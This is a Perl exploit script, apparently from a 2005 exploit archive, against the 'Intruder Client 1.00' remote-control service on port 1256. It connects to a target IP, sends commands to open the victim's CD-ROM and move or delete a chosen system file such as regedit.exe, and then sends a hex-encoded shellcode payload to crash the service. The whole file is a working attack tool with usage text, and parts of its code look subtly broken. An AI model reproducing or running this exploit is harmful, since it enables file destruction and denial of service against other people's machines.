#!/usr/bin/perl
#
# Intruder Command Execution DOS Exploit
# --------------------------------------
#   Infam0us Gr0up - Securiti Research
#
#
# [?] Version: libwww-perl-5.76
# [+] Connecting to 127.0.0.1..
# [+] Connected
# [+] Backup for files..[DONE]
# [+] Build malicious pages..[DONE]
# [+] Open CDRom victim..[DONE]
# [+] Delete C:\WINNT\regedit.exe..[DONE]
# [+] Now attacking ..[SUCCESS]
# [+] Check if Server D0S'ed!
#
# Tested on Windows2000 SP4(Win NT)
# Info : infamous.2hell.com
#

use IO::Socket;
use LWP;
use Tk;
use Win32::File;


$subject = "Intruder Command Execution DOS Exploit";
$vers = "Intruder Client 1.00";
$vendor = "http://digilander.iol.it/TatankaRock";
$codz = "basher13 - basher13(at)linuxmail.org";

$ARGC=@ARGV;

if ($ARGC !=2) {
    print "\n";
    print "     $subject\n";
    print "-------------------------------------------------\n";
    print "     Infam0us Gr0up - Securiti Research\n\n";
    print "Usage: $0 [remote IP] [file Path]\n";
    print "Exam: $0 127.0.0.1 C:\\WINNT\\regedit.exe\n";
    print "- [remote IP] = Target host IP/Hostname\n";
    print "- [file Path] = Path file to delete\n";
    exit(1);
}

$host = $ARGV[0];
$delfile = $ARGV[1];
# Modify to own feed
$text = "Subject: $subject
Version: $vers
URL: $vendor
Coders: $codz";
$box = "C:\-[$subject]-.htm";

$shellcore = 
"Moving_Dialog,0x13:test:1"."\x68\x62\x69\x1\x1\x68\x72\x64\x60\x73\x68\x68\x21\x53".
"\x64\x68\x74\x73\x68\x75\x68\x21\x52\x64\x62\x68\x74\x71\x21\x2C\x68\x21\x46\x73\x31".
"\x68\x6C\x31\x74\x72\x68\x48\x6F\x67\x60\x68\x21\x43\x58\x21\x68\x55\x40\x42\x4A\x68".
"\x46\x21\x40\x55\x68\x43\x44\x48\x4F\x68\x49\x40\x45\x21\x68\x58\x4E\x54\x21\x68\x42".
"\x4A\x20\x20\x68\x40\x55\x55\x40\x68\x45\x4E\x52\x21\x68\x42\x4A\x20\x20\x68\x40\x55".
"\x55\x40\x68\x45\x4E\x52\x21\x33\xC9\x8B\xDC\x80\x33\x1\x43\x41\x83\xF9\x52\x75\xF6".
"\x54\xC3";

print "\n";
print "       $subject\n";
print "-------------------------------------------------------\n";
print "[?] Version: libwww-perl-$LWP::VERSION\n";
print "[+] Connecting to $host..\n";
sleep(2);
$socket = new IO::Socket::INET (PeerAddr => "$host",
                                PeerPort => 1256,
                                Proto => 'tcp');
                                die unless $socket;
print "[+] Connected\n";
sleep(2);
print "[+] Backup for files..";
$lama = $delfile;
$baru = "$delfile.BAK.$$(basher13)";

 open(OLD, "< $lama")         or die "FAILED to open $lama\n[-] Reason: Try to another place..\n";
 open(NEW, "> $baru")         or die "can't open $baru: $!\n";

 while () {
        s/\b(p)earl\b/${1}erl/i;
        (print NEW $_)       or die "FAILED to write to $baru\n[-] Reason: Server has secure permission\n";
    }
 close(OLD)                  or die "FAILED to close $lama\n";
 close(NEW)                  or die "can't close $baru\n";
print "[DONE]\n";     
print "[+] Build malicious pages..";

open(OUT, ">$box") or die("unable to open $box: $!");
open FH, ">$box";
print FH "$text";
print "[DONE]\n";
close FH;

print "[+] Open CDRom victim..";
print $socket "OpenCDROM,";
sleep(1);
print "[DONE]\n";
print "[+] Delete $delfile..";
print $socket "Move,$delfile|$box";
sleep(2);
print "[DONE]\n";
print "[+] Now attacking ..";
sleep(1);
print $socket "$shellcore";
sleep(3);
print "[SUCCESS]\n";
close $socket;
print "[+] Server D0S'ed!\n";
print "-------------------------------------------------------\n";
my $mw = MainWindow->new(-title => 'INFO',);
    my $var;

    my $opt = $mw->Optionmenu(
                
                -options => [qw()],
                -command => sub { print "[>] ", shift, "\n" },
                -variable => \$var,
                )->pack;
    $opt->addOptions([- Subject=>$subject],[- Version=>$vers],[- Vendor=>$vendor],[- Coder=>$codz]);   
    $mw->Button(-text=>'CLOSE', -command=>sub{$mw->destroy})->pack;
    MainLoop;

# milw0rm.com [2005-07-21] 